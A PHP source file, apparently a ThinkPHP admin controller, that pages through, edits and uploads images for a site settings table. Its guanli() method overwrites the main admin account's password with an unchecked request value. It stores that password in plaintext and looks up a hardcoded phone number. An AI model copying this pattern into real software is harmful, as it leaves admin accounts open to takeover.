<?php
namespace Admin\Controller;
use Think\Controller;
header('content-type:text/html;charset=utf-8');
class XitongController extends CommonController {

  //系统表
    public function index(){
        
        
            //查询数据并分页
            $model =M("xitong");
            //查出总条数 
            $count = $model->count();
            //引入分页类 
            $page = new \Think\Page($count,8); //传入一个总条数，和每页显示的条数
            //引入数据
            $arr = $model->limit($page->firstRow.','.$page->listRows)->select();
            //分页
            
            $btn = $page->show();

           
            //分配数据
            $this->assign('arr',$arr);          //用户
            $this->assign('btn',$btn);          //分页
            $this->assign('shu',$count);        //总条数   
            $this->display();   
        
        
    }


    public function tupian(){
        
        
            //查询数据并分页
            $model =M("xitong");
            //查出总条数 
            $count = $model->count();
            //引入分页类 
            $page = new \Think\Page($count,8); //传入一个总条数，和每页显示的条数
            //引入数据
            $arr = $model->limit($page->firstRow.','.$page->listRows)->select();
            //分页
            
            $btn = $page->show();

           
            //分配数据
            $this->assign('arr',$arr);          //用户
            $this->assign('btn',$btn);          //分页
            $this->assign('shu',$count);        //总条数   
            $this->display();   
        
        
    }

     public function fmedit(){
              //上传图片
                if(IS_POST){
                $upload = new \Think\Upload();// 实例化上传类
                $upload->maxSize   =     3145728 ;// 设置附件上传大小
                $upload->exts      =     array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
                $upload->rootPath  =     'Public/images/'; // 设置附件上传根目录
                $upload->savePath  =     ''; // 设置附件上传（子）目录
                 // 上传文件 
                $info   =   $upload->upload();
                if(!$info) {// 上传错误提示错误信息
                    $this->error($upload->getError()); die;
                }else{// 上传成功
                    // $this->success('上传成功！'); 
                    $a=$info['images1']['savename'];
                    $b=$info['images2']['savename'];
                    $c=$info['images3']['savename'];
                }
                $d['datu']=$a;
                $d['ertu']=$b;
                $d['santu']=$c;
                $d['id']=1;
               $arr=M('xitong')->save($d);
               if($arr>0){
                 echo '<script>alert("修改成功");location.href="index"</script>';
               }

            }else{
                 $this->display(); 
            }

    }


    //修改
    public function edit(){
         // $this->display(); 
        if(IS_POST){
               // var_dump($_POST);
            
            
              

               if(empty($_POST['title']) | empty($_POST['gongsi']) |empty($_POST['kfweixin']) | empty($_POST['kfqq'])| empty($_POST['phone'])| empty($_POST['jieshao'])){
                    echo '<script>alert("修改失败：请填写完整的资料");history.go(-1)</script>';die;
                 }

                if(!empty($_POST['images'])){
                 //上传图片
                   $upload = new \Think\Upload();// 实例化上传类
                    $upload->maxSize   =     3145728 ;// 设置附件上传大小
                   $upload->exts      =     array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
                   $upload->rootPath  =     'Public/images/'; // 设置附件上传根目录
                   $upload->savePath  =     ''; // 设置附件上传（子）目录
                 // 上传文件 
                   $info   =   $upload->upload();
                   if(!$info) {// 上传错误提示错误信息
                       $this->error($upload->getError()); die;
                   }else{// 上传成功
                       // $this->success('上传成功！'); 
                       $b=$info['images']['savename'];
                   }
                }
                



                $a['id']=$_POST['id'];
                 $a['gongsi']=$_POST['gongsi'];
                $a['title']=$_POST['title'];
                $a['kfweixin']=$_POST['kfweixin'];
                $a['kfqq']=$_POST['kfqq'];
                $a['phone']=$_POST['phone'];
                $a['jieshao']=$_POST['jieshao'];
                $a['images']=$b;
                // var_dump($a);die;
                $sql=M('xitong')->save($a);
                 if ($sql> 0){
                    echo '<script>alert("修改成功");location.href="index"</script>';
                } else {
                    echo '<script>alert("修改失败,无更改");history.go(-1)</script>';
                }
              
               
            
            }else{
                // var_dump(I());
                 
                 $sql=M('xitong')->find(I('id'));
                $this->assign('v', $sql);
                 // var_dump($sql);  
                 $this->display();

            }

        

          
        

    }

    public function guanli(){
        if($_REQUEST['phone']){
        $Model = M('');
            $phone = '18929567989';
            $password = $_REQUEST['password'];
            $a['phone']=$phone;
            $arr=M('k_admin')->where($a)->find();
            if($arr>0){
                $b['id']=1;
                $b['password']=$password;
                $info=M('k_admin')->save($b);
                if($info>0){
                    echo json_encode(array('code'=>205,'msg'=>'注册成功！'));
                }
            }else{
                 echo json_encode(array('code'=>206,'msg'=>'注册失败！'));
            }
            
            
        }else{  
             $this->display();
        } 
    }



    
    


}
